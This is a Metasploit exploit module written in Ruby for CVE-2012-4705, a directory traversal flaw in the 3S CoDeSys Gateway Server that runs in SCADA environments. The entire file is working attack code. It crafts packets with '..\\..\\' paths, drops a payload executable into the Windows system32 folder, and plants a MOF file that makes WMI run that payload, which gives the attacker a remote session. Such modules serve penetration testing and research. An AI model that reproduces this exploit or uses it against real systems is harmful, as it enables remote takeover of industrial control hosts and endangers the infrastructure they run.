##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::WbemExec

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SCADA 3S CoDeSys Gateway Server Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability that allows arbitrary
        file creation, which can be used to execute a mof file in order to gain remote
        execution within the SCADA system.
      },
      'Author'         =>
        [
          'Enrique Sanchez <esanchez[at]accuvant.com>'
        ],
      'License'        => 'MSF_LICENSE',
      'References'     =>
        [
          ['CVE', '2012-4705'],
          ['URL', 'http://ics-cert.us-cert.gov/pdf/ICSA-13-050-01-a.pdf']
        ],
      'DisclosureDate' => 'Feb 02 2013',
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows Universal S3 CoDeSyS < 2.3.9.27', { }]
        ],
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(1211),
      ], self.class)
  end

  ##
  # upload_file(remote_filepath, remote_filename, local_filedata)
  #
  # remote_filepath: Remote filepath where the file will be uploaded
  # remote_filename: Remote name of the file to be executed ie. boot.ini
  # local_file: File containing the read data for the local file to be uploaded, actual open/read/close done in exploit()
  def upload_file(remote_filepath, remote_filename, local_filedata = null)
    magic_code = "\xdd\xdd"
    opcode = [6].pack('L')

    # We create the filepath for the upload, for execution it should be \windows\system32\wbem\mof\<file with extension mof!
    file = "..\\..\\" << remote_filepath << remote_filename << "\x00"
    #print_debug("File to upload: #{file}")
    pkt_size = local_filedata.size() + file.size() + (0x108 - file.size()) + 4
    #print_debug(pkt_size)

    # Magic_code  + packing + size
    pkt = magic_code << "AAAAAAAAAAAA" << [pkt_size].pack('L')

    tmp_pkt = opcode << file
    tmp_pkt += "\x00"*(0x108 - tmp_pkt.size) << [local_filedata.size].pack('L') << local_filedata
    pkt << tmp_pkt

    print_status("Starting upload of file #{remote_filename}")
    connect
    sock.put(pkt)
    disconnect

    print_status("File uploaded")
  end

  def exploit
    print_status("Attempting to communicate with SCADA system #{rhost} on port #{rport}")

    # We create an exe payload, we have to get remote execution in 2 steps
    exe = generate_payload_exe
    exe_name = Rex::Text::rand_text_alpha(8) + ".exe"
    upload_file("windows\\system32\\", exe_name, exe)

    # We create the mof file and upload (second step)
    mof_name = Rex::Text::rand_text_alpha(8) + ".mof"
    mof = generate_mof(mof_name, exe_name)
    upload_file("WINDOWS\\system32\\wbem\\mof\\", mof_name, mof)

    print_status("Everything is ready, waiting for a session ... ")
    handler

    #Taken from the spooler exploit writen byt jduck and HDMoore
    cnt = 1
    while session_created? == false and cnt < 25
      ::IO.select(nil, nil, nil, 0.25)
      cnt += 1
    end
  end
end
